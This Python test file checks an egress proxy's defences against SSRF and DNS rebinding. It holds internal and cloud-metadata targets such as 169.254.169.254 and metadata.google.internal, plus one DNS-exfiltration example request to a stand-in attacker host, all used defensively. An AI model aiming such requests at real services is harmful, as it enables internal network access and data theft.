"""The egress broker's destination decisions, at the component that dials.

These tests speak the proxy protocol to a real broker listener over loopback and
watch two real destination servers -- one standing in for a public address, one
for a private one. That is the point of the module: the assertion is never "Lumi
reported a refusal", it is **which server received a connection**, plus the
literal address the broker asked to open a socket to.

The two seams the tests use are the two the broker was given for exactly this:
an injectable resolver (so a rebinding DNS answer is a list, not a race) and an
injectable connector (so an address that passed policy can be a real, routable
string while the socket lands on a local fixture). Production wiring uses
neither, and `test_production_wiring_dials_directly` asserts that.
"""

import asyncio
from collections.abc import AsyncIterator

import pytest

from app.browser.config import WorkerSettings
from app.browser.egress_broker import (
    MANAGED_CHROMIUM_ARGS,
    MANAGED_CHROMIUM_CHANNEL,
    BrokerMode,
    EgressBroker,
    managed_launch_options,
)
from app.domain.public_url import (
    BROKER_POLICY_VERSION,
    PublicUrlPolicy,
    system_resolver,
)

#: Globally routable literals, used only as *names for an address class*. No
#: test ever opens a socket to them: the recording connector maps them to a
#: local fixture port, and asserts on the mapping key.
PUBLIC_V4 = "93.184.216.34"
PUBLIC_V4_ALT = "93.184.216.35"
PUBLIC_V6 = "2606:2800:220:1:248:1893:25c8:1946"
PRIVATE_V4 = "10.0.0.5"
LOOPBACK_V4 = "127.0.0.1"
METADATA_V4 = "169.254.169.254"
LINK_LOCAL_V6 = "fe80::1"
UNIQUE_LOCAL_V6 = "fd00::1"
LOOPBACK_V6 = "::1"


class Destination:
    """A server that counts the connections it actually received."""

    def __init__(self) -> None:
        self.connections = 0
        self.received = b""
        self._server: asyncio.base_events.Server | None = None

    async def start(self) -> None:
        self._server = await asyncio.start_server(self._serve, "127.0.0.1", 0)

    async def _serve(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        self.connections += 1
        try:
            # Nothing is written until something is received, so a test can tell
            # "the tunnel carried my bytes" from "the socket was merely opened".
            self.received += await reader.read(1_024)
            writer.write(
                b"HTTP/1.1 200 OK\r\nContent-Length: 6\r\nConnection: close\r\n\r\nserved"
            )
            await writer.drain()
        except (OSError, ConnectionError):  # pragma: no cover - teardown noise
            pass
        finally:
            writer.close()

    @property
    def port(self) -> int:
        assert self._server is not None
        return int(self._server.sockets[0].getsockname()[1])

    async def aclose(self) -> None:
        if self._server is not None:
            self._server.close()


class Resolver:
    """A DNS server the test owns, including a hostile one."""

    def __init__(self, answers: dict[str, list[list[str]]] | None = None) -> None:
        self.answers = answers or {}
        self.queries: list[str] = []
        self.fail = False

    async def __call__(self, host: str) -> list[str]:
        self.queries.append(host)
        if self.fail:
            raise OSError("no such host")
        sequence = self.answers.get(host)
        if not sequence:
            raise OSError("no such host")
        # Every answer after the last one repeats it, so a two-answer fixture
        # describes "first this, then that, for ever".
        return sequence.pop(0) if len(sequence) > 1 else list(sequence[0])


class Connector:
    """Records the literal address asked for, then connects to a local fixture."""

    def __init__(self, routes: dict[str, int], unreachable: frozenset[str] = frozenset()) -> None:
        self.routes = routes
        self.unreachable = unreachable
        self.asked: list[tuple[str, int]] = []

    async def __call__(
        self, address: str, port: int
    ) -> tuple[asyncio.StreamReader, asyncio.StreamWriter]:
        self.asked.append((address, port))
        if address in self.unreachable:
            raise OSError("unreachable")
        local = self.routes.get(address)
        if local is None:
            raise OSError("no route in this fixture")
        return await asyncio.open_connection("127.0.0.1", local)


@pytest.fixture
def policy() -> PublicUrlPolicy:
    return PublicUrlPolicy(version=BROKER_POLICY_VERSION, allow_any_public_host=True)


class Harness:
    def __init__(
        self,
        broker: EgressBroker,
        resolver: Resolver,
        connector: Connector,
        public: Destination,
        private: Destination,
    ) -> None:
        self.broker = broker
        self.resolver = resolver
        self.connector = connector
        self.public = public
        self.private = private

    async def request(
        self,
        line: str,
        *,
        credential: str | None = None,
        payload: bytes = b"",
    ) -> tuple[int, str, bytes]:
        """One proxy request. Returns (status, refusal code, tunnelled reply)."""
        authorization = (
            credential if credential is not None else self.broker.credential.header_value
        )
        head = f"{line} HTTP/1.1\r\nHost: proxy\r\n"
        if authorization:
            head += f"Proxy-Authorization: {authorization}\r\n"
        head += "\r\n"
        reader, writer = await asyncio.open_connection("127.0.0.1", self.broker.port)
        try:
            writer.write(head.encode("latin-1"))
            await writer.drain()
            response = await asyncio.wait_for(reader.read(4_096), timeout=10)
            fields = response.split(b" ", 2)
            status = int(fields[1]) if len(fields) > 1 and fields[1].isdigit() else 0
            refusal = ""
            for header in response.split(b"\r\n"):
                if header.lower().startswith(b"x-lumi-refusal:"):
                    refusal = header.split(b":", 1)[1].strip().decode("ascii")
            body = b""
            if status == 200 and payload:
                writer.write(payload)
                await writer.drain()
                body = await asyncio.wait_for(reader.read(4_096), timeout=10)
            return status, refusal, body
        finally:
            writer.close()

    async def raw_connect(self, port: int) -> None:
        """Open a socket to a port the broker no longer listens on."""
        _, writer = await asyncio.open_connection("127.0.0.1", port)
        writer.close()


@pytest.fixture
async def harness(policy: PublicUrlPolicy) -> AsyncIterator[Harness]:
    public, private = Destination(), Destination()
    await public.start()
    await private.start()
    resolver = Resolver()
    connector = Connector(
        {
            PUBLIC_V4: public.port,
            PUBLIC_V4_ALT: public.port,
            PUBLIC_V6: public.port,
            PRIVATE_V4: private.port,
            LOOPBACK_V4: private.port,
            METADATA_V4: private.port,
            LINK_LOCAL_V6: private.port,
            UNIQUE_LOCAL_V6: private.port,
            LOOPBACK_V6: private.port,
        }
    )
    broker = EgressBroker(policy, resolver=resolver, connector=connector)
    await broker.start()
    try:
        yield Harness(broker, resolver, connector, public, private)
    finally:
        await broker.aclose()
        await public.aclose()
        await private.aclose()


# ---- the pin ------------------------------------------------------------------


async def test_a_permitted_host_is_dialled_at_the_address_that_was_checked(
    harness: Harness,
) -> None:
    harness.resolver.answers["example.com"] = [[PUBLIC_V4]]
    status, refusal, body = await harness.request(
        "CONNECT example.com:443", payload=b"hello"
    )
    assert (status, refusal) == (200, "")
    assert harness.connector.asked == [(PUBLIC_V4, 443)]
    assert harness.broker.counters.dialled == [PUBLIC_V4]
    assert harness.public.connections == 1
    assert harness.private.connections == 0
    # The bytes crossed the tunnel in both directions, and the destination saw
    # exactly what was written: the broker relays, it does not rewrite.
    assert body.endswith(b"served")
    assert harness.public.received == b"hello"


async def test_dns_rebinding_cannot_move_a_later_connection_to_a_private_address(
    harness: Harness,
) -> None:
    """The documented Milestone 7b gap, closed at the component that connects."""
    harness.resolver.answers["rebind.example.com"] = [[PUBLIC_V4], [PRIVATE_V4]]

    first = await harness.request("CONNECT rebind.example.com:443")
    second = await harness.request("CONNECT rebind.example.com:443")

    assert first[0] == 200
    assert (second[0], second[1]) == (403, "non_public_address")
    # Both requests resolved: no verdict was remembered from the first.
    assert harness.resolver.queries == ["rebind.example.com", "rebind.example.com"]
    assert harness.connector.asked == [(PUBLIC_V4, 443)]
    assert harness.private.connections == 0


async def test_alternating_answers_are_judged_one_connection_at_a_time(
    harness: Harness,
) -> None:
    harness.resolver.answers["flip.example.com"] = [[PUBLIC_V4], [PRIVATE_V4], [PUBLIC_V4]]
    outcomes = [
        (await harness.request("CONNECT flip.example.com:443"))[:2] for _ in range(3)
    ]
    assert outcomes == [(200, ""), (403, "non_public_address"), (200, "")]
    assert harness.private.connections == 0
    assert harness.public.connections == 2


async def test_a_mixed_answer_refuses_the_whole_host(harness: Harness) -> None:
    """Never "use the public one and ignore the rest": that is the hostile shape."""
    harness.resolver.answers["mixed.example.com"] = [[PUBLIC_V4, PRIVATE_V4]]
    status, refusal, _ = await harness.request("CONNECT mixed.example.com:443")
    assert (status, refusal) == (403, "non_public_address")
    assert harness.connector.asked == []
    assert harness.public.connections == 0
    assert harness.private.connections == 0


async def test_a_public_v6_and_v4_answer_is_allowed(harness: Harness) -> None:
    harness.resolver.answers["dual.example.com"] = [[PUBLIC_V6, PUBLIC_V4]]
    status, _, _ = await harness.request("CONNECT dual.example.com:443")
    assert status == 200
    assert harness.connector.asked == [(PUBLIC_V6, 443)]


@pytest.mark.parametrize(
    "address",
    [LOOPBACK_V4, LOOPBACK_V6, UNIQUE_LOCAL_V6, LINK_LOCAL_V6, METADATA_V4, PRIVATE_V4],
)
async def test_non_public_answers_are_refused_and_never_contacted(
    harness: Harness, address: str
) -> None:
    harness.resolver.answers["target.example.com"] = [[address]]
    status, refusal, _ = await harness.request("CONNECT target.example.com:443")
    assert (status, refusal) == (403, "non_public_address")
    assert harness.connector.asked == []
    assert harness.private.connections == 0


async def test_a_public_answer_beside_a_v6_private_one_is_refused(harness: Harness) -> None:
    harness.resolver.answers["sneaky.example.com"] = [[PUBLIC_V4, UNIQUE_LOCAL_V6]]
    status, refusal, _ = await harness.request("CONNECT sneaky.example.com:443")
    assert (status, refusal) == (403, "non_public_address")
    assert harness.public.connections == 0


async def test_dns_failure_refuses_rather_than_guesses(harness: Harness) -> None:
    harness.resolver.fail = True
    status, refusal, _ = await harness.request("CONNECT example.com:443")
    assert (status, refusal) == (403, "dns_failed")
    assert harness.connector.asked == []


async def test_several_public_addresses_are_tried_in_order(harness: Harness) -> None:
    harness.connector.unreachable = frozenset({PUBLIC_V4})
    harness.resolver.answers["many.example.com"] = [[PUBLIC_V4, PUBLIC_V4_ALT]]
    status, _, _ = await harness.request("CONNECT many.example.com:443")
    assert status == 200
    assert harness.connector.asked == [(PUBLIC_V4, 443), (PUBLIC_V4_ALT, 443)]
    assert harness.public.connections == 1


# ---- shape, ports and literals -------------------------------------------------


@pytest.mark.parametrize(
    ("target", "code"),
    [
        ("CONNECT localhost:443", "local_host"),
        ("CONNECT db.internal:443", "local_host"),
        ("CONNECT metadata.google.internal:443", "local_host"),
        ("CONNECT router.local:443", "local_host"),
        ("CONNECT single:443", "local_host"),
        ("CONNECT 127.0.0.1:443", "ip_literal"),
        ("CONNECT 10.0.0.5:443", "ip_literal"),
        ("CONNECT [::1]:443", "ip_literal"),
        ("CONNECT [fd00::1]:443", "ip_literal"),
        ("CONNECT 169.254.169.254:443", "ip_literal"),
        ("CONNECT user@example.com:443", "invalid_host"),
        ("CONNECT example.com/path:443", "invalid_host"),
        ("CONNECT example.com?q=1:443", "invalid_host"),
        ("CONNECT example.com#f:443", "invalid_host"),
        ("CONNECT example.com:22", "port_not_allowed"),
        ("CONNECT example.com:8080", "port_not_allowed"),
        ("CONNECT example.com:80", "port_not_allowed"),
    ],
)
async def test_refused_before_any_name_is_looked_up(
    harness: Harness, target: str, code: str
) -> None:
    status, refusal, _ = await harness.request(target)
    assert (status, refusal) == (403, code)
    assert harness.resolver.queries == []
    assert harness.connector.asked == []
    assert harness.private.connections == 0


async def test_plaintext_http_to_an_unconfigured_origin_is_refused(harness: Harness) -> None:
    status, refusal, _ = await harness.request("GET http://example.com/page")
    assert (status, refusal) == (403, "plaintext_not_allowed")
    assert harness.resolver.queries == []


async def test_an_origin_form_request_is_not_a_proxy_request(harness: Harness) -> None:
    status, refusal, _ = await harness.request("GET /page")
    assert (status, refusal) == (400, "bad_request")


# ---- the credential ------------------------------------------------------------


async def test_an_unauthenticated_client_gets_407_and_no_lookup(harness: Harness) -> None:
    harness.resolver.answers["example.com"] = [[PUBLIC_V4]]
    status, refusal, _ = await harness.request("CONNECT example.com:443", credential="")
    assert (status, refusal) == (407, "proxy_authentication_required")
    assert harness.broker.counters.unauthenticated == 1
    assert harness.resolver.queries == []
    assert harness.connector.asked == []


async def test_a_credential_from_another_broker_generation_is_refused(
    harness: Harness, policy: PublicUrlPolicy
) -> None:
    """A worker that was replaced hands out a credential its successor never honours."""
    stale = EgressBroker(policy)
    assert stale.generation != harness.broker.generation
    status, _, _ = await harness.request(
        "CONNECT example.com:443", credential=stale.credential.header_value
    )
    assert status == 407


# ---- freeze --------------------------------------------------------------------


async def test_frozen_refuses_without_performing_an_upstream_dns_lookup(
    harness: Harness,
) -> None:
    """The Milestone 8b primitive: a name lookup is itself an exfiltration channel."""
    harness.resolver.answers["secret-value.attacker.example.com"] = [[PUBLIC_V4]]
    assert harness.broker.freeze() == 0
    assert harness.broker.mode is BrokerMode.FROZEN

    status, refusal, _ = await harness.request(
        "CONNECT secret-value.attacker.example.com:443"
    )

    assert (status, refusal) == (403, "frozen")
    assert harness.resolver.queries == []
    assert harness.broker.counters.resolutions == 0
    assert harness.connector.asked == []
    assert harness.public.connections == 0
    assert harness.private.connections == 0


async def test_thawing_restores_the_ordinary_decision(harness: Harness) -> None:
    harness.resolver.answers["example.com"] = [[PUBLIC_V4]]
    harness.broker.freeze()
    assert (await harness.request("CONNECT example.com:443"))[1] == "frozen"
    harness.broker.thaw()
    assert (await harness.request("CONNECT example.com:443"))[0] == 200


async def test_a_frozen_broker_refuses_a_configured_local_origin_too(
    policy: PublicUrlPolicy,
) -> None:
    fixture = Destination()
    await fixture.start()
    broker = EgressBroker(
        policy, configured_origins=frozenset({f"http://127.0.0.1:{fixture.port}"})
    )
    await broker.start()
    harness = Harness(broker, Resolver(), Connector({}), fixture, fixture)
    try:
        broker.freeze()
        status, refusal, _ = await harness.request(f"CONNECT 127.0.0.1:{fixture.port}")
        assert (status, refusal) == (403, "frozen")
        assert fixture.connections == 0
    finally:
        await broker.aclose()
        await fixture.aclose()


# ---- configured local origins ---------------------------------------------------


async def test_a_configured_fixture_origin_is_reachable_over_plaintext(
    policy: PublicUrlPolicy,
) -> None:
    fixture, canary = Destination(), Destination()
    await fixture.start()
    await canary.start()
    broker = EgressBroker(
        policy, configured_origins=frozenset({f"http://127.0.0.1:{fixture.port}"})
    )
    await broker.start()
    harness = Harness(broker, Resolver(), Connector({}), fixture, canary)
    try:
        allowed = await harness.request(f"GET http://127.0.0.1:{fixture.port}/page")
        refused = await harness.request(f"GET http://127.0.0.1:{canary.port}/page")
        tunnel = await harness.request(f"CONNECT 127.0.0.1:{fixture.port}", payload=b"x")

        assert allowed[0] == 200
        assert (refused[0], refused[1]) == (403, "plaintext_not_allowed")
        assert tunnel[0] == 200
        assert fixture.connections == 2
        assert canary.connections == 0
    finally:
        await broker.aclose()
        await fixture.aclose()
        await canary.aclose()


async def test_a_configured_origin_must_be_loopback(policy: PublicUrlPolicy) -> None:
    """A public origin here would be dialled by name -- the unpinned connection."""
    with pytest.raises(ValueError, match="http://127.0.0.1"):
        EgressBroker(policy, configured_origins=frozenset({"http://example.com:80"}))


# ---- lifecycle ------------------------------------------------------------------


async def test_a_closed_broker_accepts_nothing(harness: Harness) -> None:
    """Broker death is the end of egress, never a fall back to direct networking."""
    harness.resolver.answers["example.com"] = [[PUBLIC_V4]]
    port = harness.broker.port
    await harness.broker.aclose()
    with pytest.raises(OSError):
        await harness.raw_connect(port)
    assert harness.public.connections == 0
    assert harness.connector.asked == []


async def test_the_listener_is_loopback_only(harness: Harness) -> None:
    assert harness.broker.server_url.startswith("http://127.0.0.1:")
    assert harness.broker.port != 0


async def test_diagnostics_carry_no_destination_and_no_credential(
    harness: Harness, caplog: pytest.LogCaptureFixture
) -> None:
    """A refusal is worth logging. What was being asked for is not."""
    harness.resolver.answers["private.example.com"] = [[PRIVATE_V4]]
    with caplog.at_level("DEBUG", logger="lumi.browser.egress_broker"):
        await harness.request("CONNECT private.example.com:443")
        await harness.request("CONNECT example.com:443", credential="")

    emitted = "\n".join(
        record.getMessage() + repr(record.__dict__) for record in caplog.records
    )
    assert "private.example.com" not in emitted
    assert harness.broker.credential.password not in emitted
    assert "Proxy-Authorization" not in emitted
    # What is kept: the stable code, the transport and the generation.
    assert "non_public_address" in emitted
    assert str(harness.broker.generation) in emitted


async def test_counters_carry_codes_and_counts_only(harness: Harness) -> None:
    harness.resolver.answers["example.com"] = [[PUBLIC_V4]]
    harness.resolver.answers["bad.example.com"] = [[PRIVATE_V4]]
    await harness.request("CONNECT example.com:443")
    await harness.request("CONNECT bad.example.com:443")
    snapshot = harness.broker.counters.snapshot()
    assert snapshot["allowed"] == {"connect": 1}
    assert snapshot["refused"] == {"non_public_address": 1}
    assert snapshot["resolutions"] == 2


# ---- the launch contract ---------------------------------------------------------


async def test_managed_launch_options_force_loopback_through_the_broker(
    harness: Harness,
) -> None:
    options = managed_launch_options(harness.broker, headless=True)
    proxy = options["proxy"]
    assert isinstance(proxy, dict)
    assert proxy["server"] == harness.broker.server_url
    # Chromium bypasses proxies for loopback by default. `<-loopback>` is the
    # token that removes that door, and it is the single most load-bearing
    # string in this slice.
    assert proxy["bypass"] == "<-loopback>"
    assert proxy["password"] == harness.broker.credential.password
    assert options["args"] == list(MANAGED_CHROMIUM_ARGS)
    assert "--disable-quic" in MANAGED_CHROMIUM_ARGS
    # Milestone 8a S1: one Chromium distribution, pinned here rather than at
    # each call site. Without the channel, `headless=True` looks for the
    # separate `chrome-headless-shell` binary, which the packaged build no
    # longer carries -- so development and the packaged app would launch
    # different browsers, and only one of them would be tested.
    assert options["channel"] == MANAGED_CHROMIUM_CHANNEL == "chromium"


def test_production_wiring_dials_directly_and_terminates_no_tls() -> None:
    """No test seam, and no certificate machinery, in the shipped path."""
    from app.browser import egress_broker

    source = (
        __import__("pathlib").Path(egress_broker.__file__).read_text(encoding="utf-8")
    )
    for forbidden in ("ssl.SSLContext", "wrap_socket", "load_cert_chain", "CERT_NONE"):
        assert forbidden not in source, f"the broker must not touch TLS ({forbidden})"

    broker = EgressBroker(PublicUrlPolicy(version=BROKER_POLICY_VERSION))
    assert broker._connector is egress_broker._dial
    assert broker._resolver is system_resolver


def test_worker_settings_broker_origins_are_exactly_the_configured_fixtures() -> None:
    settings = WorkerSettings(
        token="0123456789abcdef0123",  # noqa: S106 - a test credential
        allowed_origins="appointment_fixture=http://127.0.0.1:8801",
        inspection_test_origins="http://127.0.0.1:8802",
        research_test_origins="http://127.0.0.1:8803",
    )
    assert settings.broker_origins == frozenset(
        {"http://127.0.0.1:8801", "http://127.0.0.1:8802", "http://127.0.0.1:8803"}
    )
    assert settings.broker_policy.allow_any_public_host is True
    assert settings.broker_policy.version == BROKER_POLICY_VERSION


def test_a_non_loopback_site_origin_is_not_given_a_plaintext_door() -> None:
    settings = WorkerSettings(
        token="0123456789abcdef0123",  # noqa: S106 - a test credential
        allowed_origins="appointment_fixture=https://booking.example.com",
    )
    assert settings.broker_origins == frozenset()
